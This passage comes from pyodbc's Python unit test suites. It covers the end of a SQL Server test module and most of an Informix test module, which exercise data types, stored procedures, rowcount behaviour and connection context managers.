        self.cursor.execute(""insert into t1 values (?, ?)"", 1, None)
        value = self.cursor.execute(""select v from t1"").fetchone()[0]
        self.assertEqual(value, None)
        self.cnxn.clear_output_converters()

    def test_login_timeout(self):
        # This can only test setting since there isn't a way to cause it to block on the server side.
        cnxns = pyodbc.connect(self.connection_string, timeout=2)

    def test_row_equal(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test')"")
        row1 = self.cursor.execute(""select n, s from t1"").fetchone()
        row2 = self.cursor.execute(""select n, s from t1"").fetchone()
        b = (row1 == row2)
        self.assertEqual(b, True)

    def test_row_gtlt(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test1')"")
        self.cursor.execute(""insert into t1 values (1, 'test2')"")
        rows = self.cursor.execute(""select n, s from t1 order by s"").fetchall()
        self.assertTrue(rows[0] < rows[1])
        self.assertTrue(rows[0] <= rows[1])
        self.assertTrue(rows[1] > rows[0])
        self.assertTrue(rows[1] >= rows[0])
        self.assertTrue(rows[0] != rows[1])

        rows = list(rows)
        rows.sort() # uses <

    def test_context_manager_success(self):
        """"""
        Ensure a successful with statement causes a commit.
        """"""
        self.cursor.execute(""create table t1(n int)"")
        self.cnxn.commit()

        with pyodbc.connect(self.connection_string) as cnxn:
            cursor = cnxn.cursor()
            cursor.execute(""insert into t1 values (1)"")

        cnxn = None
        cursor = None

        rows = self.cursor.execute(""select n from t1"").fetchall()
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0][0], 1)


    def test_context_manager_fail(self):
        """"""
        Ensure an exception in a with statement causes a rollback.
        """"""
        self.cursor.execute(""create table t1(n int)"")
        self.cnxn.commit()

        try:
            with pyodbc.connect(self.connection_string) as cnxn:
                cursor = cnxn.cursor()
                cursor.execute(""insert into t1 values (1)"")
                raise Exception(""Testing failure"")
        except Exception:
            pass

        cnxn = None
        cursor = None

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, 0)


    def test_cursor_context_manager_success(self):
        """"""
        Ensure a successful with statement using a cursor causes a commit.
        """"""
        self.cursor.execute(""create table t1(n int)"")
        self.cnxn.commit()

        with pyodbc.connect(self.connection_string).cursor() as cursor:
            cursor.execute(""insert into t1 values (1)"")

        cursor = None

        rows = self.cursor.execute(""select n from t1"").fetchall()
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0][0], 1)


    def test_cursor_context_manager_fail(self):
        """"""
        Ensure an exception in a with statement using a cursor causes a rollback.
        """"""
        self.cursor.execute(""create table t1(n int)"")
        self.cnxn.commit()

        try:
            with pyodbc.connect(self.connection_string).cursor() as cursor:
                cursor.execute(""insert into t1 values (1)"")
                raise Exception(""Testing failure"")
        except Exception:
            pass

        cursor = None

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, 0)


    def test_untyped_none(self):
        # From issue 129
        value = self.cursor.execute(""select ?"", None).fetchone()[0]
        self.assertEqual(value, None)

    def test_large_update_nodata(self):
        self.cursor.execute('create table t1(a varbinary(max))')
        hundredkb = bytearray('x'*100*1024)
        self.cursor.execute('update t1 set a=? where 1=0', (hundredkb,))

    def test_func_param(self):
        self.cursor.execute('''
                            create function func1 (@testparam varchar(4))
                            returns @rettest table (param varchar(4))
                            as
                            begin
                                insert @rettest
                                select @testparam
                                return
                            end
                            ''')
        self.cnxn.commit()
        value = self.cursor.execute(""select * from func1(?)"", 'test').fetchone()[0]
        self.assertEqual(value, 'test')

    def test_no_fetch(self):
        # Issue 89 with FreeTDS: Multiple selects (or catalog functions that issue selects) without fetches seem to
        # confuse the driver.
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')

    def test_drivers(self):
        drivers = pyodbc.drivers()
        self.assertEqual(list, type(drivers))
        self.assertTrue(len(drivers) > 0)

        m = re.search('DRIVER={([^}]+)}', self.connection_string, re.IGNORECASE)
        current = m.group(1)
        self.assertTrue(current in drivers)

    def test_prepare_cleanup(self):
        # When statement is prepared, it is kept in case the next execute uses the same statement.  This must be
        # removed when a non-execute statement is used that returns results, such as SQLTables.

        self.cursor.execute(""select top 1 name from sysobjects where name = ?"", ""bogus"")
        self.cursor.fetchone()

        self.cursor.tables(""bogus"")

        self.cursor.execute(""select top 1 name from sysobjects where name = ?"", ""bogus"")
        self.cursor.fetchone()

    def test_exc_integrity(self):
        ""Make sure an IntegretyError is raised""
        # This is really making sure we are properly encoding and comparing the SQLSTATEs.
        self.cursor.execute(""create table t1(s1 varchar(10) primary key)"")
        self.cursor.execute(""insert into t1 values ('one')"")
        self.assertRaises(pyodbc.IntegrityError, self.cursor.execute, ""insert into t1 values ('one')"")

    def test_emoticons(self):
        # https://github.com/mkleehammer/pyodbc/issues/423
        #
        # When sending a varchar parameter, pyodbc is supposed to set ColumnSize to the number
        # of characters.  Ensure it works even with 4-byte characters.
        #
        # http://www.fileformat.info/info/unicode/char/1f31c/index.htm

        v = ""x \U0001F31C z""

        self.cursor.execute(""create table t1(s varchar(100))"")
        self.cursor.execute(""insert into t1 values (?)"", v)

        result = self.cursor.execute(""select s from t1"").fetchone()[0]

        self.assertEqual(result, v)
        
def main():
    from optparse import OptionParser
    parser = OptionParser(usage=usage)
    parser.add_option(""-v"", ""--verbose"", action=""count"", help=""Increment test verbosity (can be used multiple times)"")
    parser.add_option(""-d"", ""--debug"", action=""store_true"", default=False, help=""Print debugging items"")
    parser.add_option(""-t"", ""--test"", help=""Run only the named test"")

    (options, args) = parser.parse_args()

    if len(args) > 1:
        parser.error('Only one argument is allowed.  Do you need quotes around the connection string?')

    if not args:
        connection_string = load_setup_connection_string('sqlservertests')

        if not connection_string:
            parser.print_help()
            raise SystemExit()
    else:
        connection_string = args[0]

    cnxn = pyodbc.connect(connection_string)
    print_library_info(cnxn)
    cnxn.close()

    suite = load_tests(SqlServerTestCase, options.test, connection_string)

    testRunner = unittest.TextTestRunner(verbosity=options.verbose)
    result = testRunner.run(suite)


if __name__ == '__main__':

    # Add the build directory to the path so we're testing the latest build, not the installed version.

    add_to_path()

    import pyodbc
    main()
/n/n/ntests3/informixtests.py/n/n#!/usr/bin/python
# -*- coding: latin-1 -*-

usage = """"""\
usage: %prog [options] connection_string

Unit tests for Informix DB.  To use, pass a connection string as the parameter.
The tests will create and drop tables t1 and t2 as necessary.

These run using the version from the 'build' directory, not the version
installed into the Python directories.  You must run python setup.py build
before running the tests.

You can also put the connection string into a tmp/setup.cfg file like so:

  [informixtests]
  connection-string=DRIVER={IBM INFORMIX ODBC DRIVER (64-bit)};SERVER=localhost;UID=uid;PWD=pwd;DATABASE=db
""""""

import sys, os, re
import unittest
from decimal import Decimal
from datetime import datetime, date, time
from os.path import join, getsize, dirname, abspath
from testutils import *

_TESTSTR = '0123456789-abcdefghijklmnopqrstuvwxyz-'

def _generate_test_string(length):
    """"""
    Returns a string of `length` characters, constructed by repeating _TESTSTR as necessary.

    To enhance performance, there are 3 ways data is read, based on the length of the value, so most data types are
    tested with 3 lengths.  This function helps us generate the test data.

    We use a recognizable data set instead of a single character to make it less likely that ""overlap"" errors will
    be hidden and to help us manually identify where a break occurs.
    """"""
    if length <= len(_TESTSTR):
        return _TESTSTR[:length]

    c = (length + len(_TESTSTR)-1) / len(_TESTSTR)
    v = _TESTSTR * c
    return v[:length]

class InformixTestCase(unittest.TestCase):

    SMALL_FENCEPOST_SIZES = [ 0, 1, 255, 256, 510, 511, 512, 1023, 1024, 2047, 2048, 4000 ]
    LARGE_FENCEPOST_SIZES = [ 4095, 4096, 4097, 10 * 1024, 20 * 1024 ]

    ANSI_FENCEPOSTS    = [ _generate_test_string(size) for size in SMALL_FENCEPOST_SIZES ]
    UNICODE_FENCEPOSTS = [ unicode(s) for s in ANSI_FENCEPOSTS ]
    IMAGE_FENCEPOSTS   = ANSI_FENCEPOSTS + [ _generate_test_string(size) for size in LARGE_FENCEPOST_SIZES ]

    def __init__(self, method_name, connection_string):
        unittest.TestCase.__init__(self, method_name)
        self.connection_string = connection_string

    def setUp(self):
        self.cnxn   = pyodbc.connect(self.connection_string)
        self.cursor = self.cnxn.cursor()

        for i in range(3):
            try:
                self.cursor.execute(""drop table t%d"" % i)
                self.cnxn.commit()
            except:
                pass

        for i in range(3):
            try:
                self.cursor.execute(""drop procedure proc%d"" % i)
                self.cnxn.commit()
            except:
                pass

        try:
            self.cursor.execute('drop function func1')
            self.cnxn.commit()
        except:
            pass

        self.cnxn.rollback()

    def tearDown(self):
        try:
            self.cursor.close()
            self.cnxn.close()
        except:
            # If we've already closed the cursor or connection, exceptions are thrown.
            pass

    def test_multiple_bindings(self):
        ""More than one bind and select on a cursor""
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t1 values (?)"", 2)
        self.cursor.execute(""insert into t1 values (?)"", 3)
        for i in range(3):
            self.cursor.execute(""select n from t1 where n < ?"", 10)
            self.cursor.execute(""select n from t1 where n < 3"")
        

    def test_different_bindings(self):
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""create table t2(d datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t2 values (?)"", datetime.now())

    def test_drivers(self):
        p = pyodbc.drivers()
        self.assertTrue(isinstance(p, list))

    def test_datasources(self):
        p = pyodbc.dataSources()
        self.assertTrue(isinstance(p, dict))

    def test_getinfo_string(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CATALOG_NAME_SEPARATOR)
        self.assertTrue(isinstance(value, str))

    def test_getinfo_bool(self):
        value = self.cnxn.getinfo(pyodbc.SQL_ACCESSIBLE_TABLES)
        self.assertTrue(isinstance(value, bool))

    def test_getinfo_int(self):
        value = self.cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)
        self.assertTrue(isinstance(value, (int, long)))

    def test_getinfo_smallint(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CONCAT_NULL_BEHAVIOR)
        self.assertTrue(isinstance(value, int))

    def test_noscan(self):
        self.assertEqual(self.cursor.noscan, False)
        self.cursor.noscan = True
        self.assertEqual(self.cursor.noscan, True)

    def test_guid(self):
        self.cursor.execute(""create table t1(g1 uniqueidentifier)"")
        self.cursor.execute(""insert into t1 values (newid())"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(len(v), 36)

    def test_nextset(self):
        self.cursor.execute(""create table t1(i int)"")
        for i in range(4):
            self.cursor.execute(""insert into t1(i) values(?)"", i)

        self.cursor.execute(""select i from t1 where i < 2 order by i; select i from t1 where i >= 2 order by i"")
        
        for i, row in enumerate(self.cursor):
            self.assertEqual(i, row.i)

        self.assertEqual(self.cursor.nextset(), True)

        for i, row in enumerate(self.cursor):
            self.assertEqual(i + 2, row.i)

    def test_fixed_unicode(self):
        value = u""t\xebsting""
        self.cursor.execute(""create table t1(s nchar(7))"")
        self.cursor.execute(""insert into t1 values(?)"", u""t\xebsting"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), unicode)
        self.assertEqual(len(v), len(value)) # If we alloc'd wrong, the test below might work because of an embedded NULL
        self.assertEqual(v, value)


    def _test_strtype(self, sqltype, value, colsize=None):
        """"""
        The implementation for string, Unicode, and binary tests.
        """"""
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)

        # Reported by Andy Hochhaus in the pyodbc group: In 2.1.7 and earlier, a hardcoded length of 255 was used to
        # determine whether a parameter was bound as a SQL_VARCHAR or SQL_LONGVARCHAR.  Apparently SQL Server chokes if
        # we bind as a SQL_LONGVARCHAR and the target column size is 8000 or less, which is considers just SQL_VARCHAR.
        # This means binding a 256 character value would cause problems if compared with a VARCHAR column under
        # 8001. We now use SQLGetTypeInfo to determine the time to switch.
        #
        # [42000] [Microsoft][SQL Server Native Client 10.0][SQL Server]The data types varchar and text are incompatible in the equal to operator.

        self.cursor.execute(""select * from t1 where s=?"", value)


    def _test_strliketype(self, sqltype, value, colsize=None):
        """"""
        The implementation for text, image, ntext, and binary.

        These types do not support comparison operators.
        """"""
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)


    #
    # varchar
    #

    def test_varchar_null(self):
        self._test_strtype('varchar', None, 100)

    # Generate a test for each fencepost size: test_varchar_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('varchar', value, len(value))
        return t
    for value in ANSI_FENCEPOSTS:
        locals()['test_varchar_%s' % len(value)] = _maketest(value)

    def test_varchar_many(self):
        self.cursor.execute(""create table t1(c1 varchar(300), c2 varchar(300), c3 varchar(300))"")

        v1 = 'ABCDEFGHIJ' * 30
        v2 = '0123456789' * 30
        v3 = '9876543210' * 30

        self.cursor.execute(""insert into t1(c1, c2, c3) values (?,?,?)"", v1, v2, v3);
        row = self.cursor.execute(""select c1, c2, c3, len(c1) as l1, len(c2) as l2, len(c3) as l3 from t1"").fetchone()

        self.assertEqual(v1, row.c1)
        self.assertEqual(v2, row.c2)
        self.assertEqual(v3, row.c3)

    def test_varchar_upperlatin(self):
        self._test_strtype('varchar', '�')

    #
    # unicode
    #

    def test_unicode_null(self):
        self._test_strtype('nvarchar', None, 100)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('nvarchar', value, len(value))
        return t
    for value in UNICODE_FENCEPOSTS:
        locals()['test_unicode_%s' % len(value)] = _maketest(value)

    def test_unicode_upperlatin(self):
        self._test_strtype('varchar', '�')

    #
    # binary
    #

    def test_null_binary(self):
        self._test_strtype('varbinary', None, 100)
     
    def test_large_null_binary(self):
        # Bug 1575064
        self._test_strtype('varbinary', None, 4000)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('varbinary', buffer(value), len(value))
        return t
    for value in ANSI_FENCEPOSTS:
        locals()['test_binary_%s' % len(value)] = _maketest(value)

    #
    # image
    #

    def test_image_null(self):
        self._test_strliketype('image', None)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strliketype('image', buffer(value))
        return t
    for value in IMAGE_FENCEPOSTS:
        locals()['test_image_%s' % len(value)] = _maketest(value)

    def test_image_upperlatin(self):
        self._test_strliketype('image', buffer('�'))

    #
    # text
    #

    # def test_empty_text(self):
    #     self._test_strliketype('text', buffer(''))

    def test_null_text(self):
        self._test_strliketype('text', None)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strliketype('text', value)
        return t
    for value in ANSI_FENCEPOSTS:
        locals()['test_text_%s' % len(value)] = _maketest(value)

    def test_text_upperlatin(self):
        self._test_strliketype('text', '�')

    #
    # bit
    #

    def test_bit(self):
        value = True
        self.cursor.execute(""create table t1(b bit)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        v = self.cursor.execute(""select b from t1"").fetchone()[0]
        self.assertEqual(type(v), bool)
        self.assertEqual(v, value)

    #
    # decimal
    #

    def _decimal(self, precision, scale, negative):
        # From test provided by planders (thanks!) in Issue 91

        self.cursor.execute(""create table t1(d decimal(%s, %s))"" % (precision, scale))

        # Construct a decimal that uses the maximum precision and scale.
        decStr = '9' * (precision - scale)
        if scale:
            decStr = decStr + ""."" + '9' * scale
        if negative:
            decStr = ""-"" + decStr
        value = Decimal(decStr)

        self.cursor.execute(""insert into t1 values(?)"", value)

        v = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(v, value)

    def _maketest(p, s, n):
        def t(self):
            self._decimal(p, s, n)
        return t
    for (p, s, n) in [ (1,  0,  False),
                       (1,  0,  True),
                       (6,  0,  False),
                       (6,  2,  False),
                       (6,  4,  True),
                       (6,  6,  True),
                       (38, 0,  False),
                       (38, 10, False),
                       (38, 38, False),
                       (38, 0,  True),
                       (38, 10, True),
                       (38, 38, True) ]:
        locals()['test_decimal_%s_%s_%s' % (p, s, n and 'n' or 'p')] = _maketest(p, s, n)


    def test_decimal_e(self):
        """"""Ensure exponential notation decimals are properly handled""""""
        value = Decimal((0, (1, 2, 3), 5)) # prints as 1.23E+7
        self.cursor.execute(""create table t1(d decimal(10, 2))"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_subquery_params(self):
        """"""Ensure parameter markers work in a subquery""""""
        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        row = self.cursor.execute(""""""
                                  select x.id
                                  from (
                                    select id
                                    from t1
                                    where s = ?
                                      and id between ? and ?
                                   ) x
                                   """""", 'test', 1, 10).fetchone()
        self.assertNotEqual(row, None)
        self.assertEqual(row[0], 1)

    def _exec(self):
        self.cursor.execute(self.sql)
        
    def test_close_cnxn(self):
        """"""Make sure using a Cursor after closing its connection doesn't crash.""""""

        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        self.cursor.execute(""select * from t1"")

        self.cnxn.close()
        
        # Now that the connection is closed, we expect an exception.  (If the code attempts to use
        # the HSTMT, we'll get an access violation instead.)
        self.sql = ""select * from t1""
        self.assertRaises(pyodbc.ProgrammingError, self._exec)

    def test_empty_string(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", """")

    def test_fixed_str(self):
        value = ""testing""
        self.cursor.execute(""create table t1(s char(7))"")
        self.cursor.execute(""insert into t1 values(?)"", ""testing"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(len(v), len(value)) # If we alloc'd wrong, the test below might work because of an embedded NULL
        self.assertEqual(v, value)

    def test_empty_unicode(self):
        self.cursor.execute(""create table t1(s nvarchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", u"""")

    def test_unicode_query(self):
        self.cursor.execute(u""select 1"")
        
    def test_negative_row_index(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", ""1"")
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row[0], ""1"")
        self.assertEqual(row[-1], ""1"")

    def test_version(self):
        self.assertEqual(3, len(pyodbc.version.split('.'))) # 1.3.1 etc.

    #
    # date, time, datetime
    #

    def test_datetime(self):
        value = datetime(2007, 1, 15, 3, 4, 5)

        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(value), datetime)
        self.assertEqual(value, result)

    def test_datetime_fraction(self):
        # SQL Server supports milliseconds, but Python's datetime supports nanoseconds, so the most granular datetime
        # supported is xxx000.

        value = datetime(2007, 1, 15, 3, 4, 5, 123000)
     
        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
     
        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(value), datetime)
        self.assertEqual(result, value)

    def test_datetime_fraction_rounded(self):
        # SQL Server supports milliseconds, but Python's datetime supports nanoseconds.  pyodbc rounds down to what the
        # database supports.

        full    = datetime(2007, 1, 15, 3, 4, 5, 123456)
        rounded = datetime(2007, 1, 15, 3, 4, 5, 123000)
     
        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", full)
     
        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(result), datetime)
        self.assertEqual(result, rounded)

    def test_date(self):
        value = date.today()
     
        self.cursor.execute(""create table t1(d date)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
     
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(type(value), date)
        self.assertEqual(value, result)

    def test_time(self):
        value = datetime.now().time()
        
        # We aren't yet writing values using the new extended time type so the value written to the database is only
        # down to the second.
        value = value.replace(microsecond=0)
         
        self.cursor.execute(""create table t1(t time)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
         
        result = self.cursor.execute(""select t from t1"").fetchone()[0]
        self.assertEqual(type(value), time)
        self.assertEqual(value, result)

    def test_datetime2(self):
        value = datetime(2007, 1, 15, 3, 4, 5)

        self.cursor.execute(""create table t1(dt datetime2)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(value), datetime)
        self.assertEqual(value, result)

    #
    # ints and floats
    #

    def test_int(self):
        value = 1234
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_int(self):
        value = -1
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_bigint(self):
        input = 3000000000
        self.cursor.execute(""create table t1(d bigint)"")
        self.cursor.execute(""insert into t1 values (?)"", input)
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(result, input)

    def test_float(self):
        value = 1234.567
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_float(self):
        value = -200
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result  = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(value, result)


    #
    # stored procedures
    #

    # def test_callproc(self):
    #     ""callproc with a simple input-only stored procedure""
    #     pass

    def test_sp_results(self):
        self.cursor.execute(
            """"""
            Create procedure proc1
            AS
              select top 10 name, id, xtype, refdate
              from sysobjects
            """""")
        rows = self.cursor.execute(""exec proc1"").fetchall()
        self.assertEqual(type(rows), list)
        self.assertEqual(len(rows), 10) # there has to be at least 10 items in sysobjects
        self.assertEqual(type(rows[0].refdate), datetime)


    def test_sp_results_from_temp(self):

        # Note: I've used ""set nocount on"" so that we don't get the number of rows deleted from #tmptable.
        # If you don't do this, you'd need to call nextset() once to skip it.

        self.cursor.execute(
            """"""
            Create procedure proc1
            AS
              set nocount on
              select top 10 name, id, xtype, refdate
              into #tmptable
              from sysobjects

              select * from #tmptable
            """""")
        self.cursor.execute(""exec proc1"")
        self.assertTrue(self.cursor.description is not None)
        self.assertTrue(len(self.cursor.description) == 4)

        rows = self.cursor.fetchall()
        self.assertEqual(type(rows), list)
        self.assertEqual(len(rows), 10) # there has to be at least 10 items in sysobjects
        self.assertEqual(type(rows[0].refdate), datetime)


    def test_sp_results_from_vartbl(self):
        self.cursor.execute(
            """"""
            Create procedure proc1
            AS
              set nocount on
              declare @tmptbl table(name varchar(100), id int, xtype varchar(4), refdate datetime)

              insert into @tmptbl
              select top 10 name, id, xtype, refdate
              from sysobjects

              select * from @tmptbl
            """""")
        self.cursor.execute(""exec proc1"")
        rows = self.cursor.fetchall()
        self.assertEqual(type(rows), list)
        self.assertEqual(len(rows), 10) # there has to be at least 10 items in sysobjects
        self.assertEqual(type(rows[0].refdate), datetime)

    def test_sp_with_dates(self):
        # Reported in the forums that passing two datetimes to a stored procedure doesn't work.
        self.cursor.execute(
            """"""
            if exists (select * from dbo.sysobjects where id = object_id(N'[test_sp]') and OBJECTPROPERTY(id, N'IsProcedure') = 1)
              drop procedure [dbo].[test_sp]
            """""")
        self.cursor.execute(
            """"""
            create procedure test_sp(@d1 datetime, @d2 datetime)
            AS
              declare @d as int
              set @d = datediff(year, @d1, @d2)
              select @d
            """""")
        self.cursor.execute(""exec test_sp ?, ?"", datetime.now(), datetime.now())
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(rows[0][0] == 0)   # 0 years apart

    def test_sp_with_none(self):
        # Reported in the forums that passing None caused an error.
        self.cursor.execute(
            """"""
            if exists (select * from dbo.sysobjects where id = object_id(N'[test_sp]') and OBJECTPROPERTY(id, N'IsProcedure') = 1)
              drop procedure [dbo].[test_sp]
            """""")
        self.cursor.execute(
            """"""
            create procedure test_sp(@x varchar(20))
            AS
              declare @y varchar(20)
              set @y = @x
              select @y
            """""")
        self.cursor.execute(""exec test_sp ?"", None)
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(rows[0][0] == None)   # 0 years apart
        

    #
    # rowcount
    #

    def test_rowcount_delete(self):
        self.assertEqual(self.cursor.rowcount, -1)
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, count)

    def test_rowcount_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.  On the other hand, we could hardcode a
        zero return value.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, 0)

    def test_rowcount_select(self):
        """"""
        Ensure Cursor.rowcount is set properly after a select statement.

        pyodbc calls SQLRowCount after each execute and sets Cursor.rowcount, but SQL Server 2005 returns -1 after a
        select statement, so we'll test for that behavior.  This is valid behavior according to the DB API
        specification, but people don't seem to like it.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""select * from t1"")
        self.assertEqual(self.cursor.rowcount, -1)

        rows = self.cursor.fetchall()
        self.assertEqual(len(rows), count)
        self.assertEqual(self.cursor.rowcount, -1)

    def test_rowcount_reset(self):
        ""Ensure rowcount is reset to -1""

        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.assertEqual(self.cursor.rowcount, 1)

        self.cursor.execute(""create table t2(i int)"")
        self.assertEqual(self.cursor.rowcount, -1)

    #
    # always return Cursor
    #

    # In the 2.0.x branch, Cursor.execute sometimes returned the cursor and sometimes the rowcount.  This proved very
    # confusing when things went wrong and added very little value even when things went right since users could always
    # use: cursor.execute(""..."").rowcount

    def test_retcursor_delete(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_select(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""select * from t1"")
        self.assertEqual(v, self.cursor)

    #
    # misc
    #

    def test_lower_case(self):
        ""Ensure pyodbc.lowercase forces returned column names to lowercase.""

        # Has to be set before creating the cursor, so we must recreate self.cursor.

        pyodbc.lowercase = True
        self.cursor = self.cnxn.cursor()

        self.cursor.execute(""create table t1(Abc int, dEf int)"")
        self.cursor.execute(""select * from t1"")

        names = [ t[0] for t in self.cursor.description ]
        names.sort()

        self.assertEqual(names, [ ""abc"", ""def"" ])

        # Put it back so other tests don't fail.
        pyodbc.lowercase = False
        
    def test_row_description(self):
        """"""
        Ensure Cursor.description is accessible as Row.cursor_description.
        """"""
        self.cursor = self.cnxn.cursor()
        self.cursor.execute(""create table t1(a int, b char(3))"")
        self.cnxn.commit()
        self.cursor.execute(""insert into t1 values(1, 'abc')"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        self.assertEqual(self.cursor.description, row.cursor_description)
        

    def test_temp_select(self):
        # A project was failing to create temporary tables via select into.
        self.cursor.execute(""create table t1(s char(7))"")
        self.cursor.execute(""insert into t1 values(?)"", ""testing"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(v, ""testing"")

        self.cursor.execute(""select s into t2 from t1"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(v, ""testing"")


    def test_money(self):
        d = Decimal('123456.78')
        self.cursor.execute(""create table t1(i int identity(1,1), m money)"")
        self.cursor.execute(""insert into t1(m) values (?)"", d)
        v = self.cursor.execute(""select m from t1"").fetchone()[0]
        self.assertEqual(v, d)


    def test_executemany(self):
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (i, str(i)) for i in range(1, 6) ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

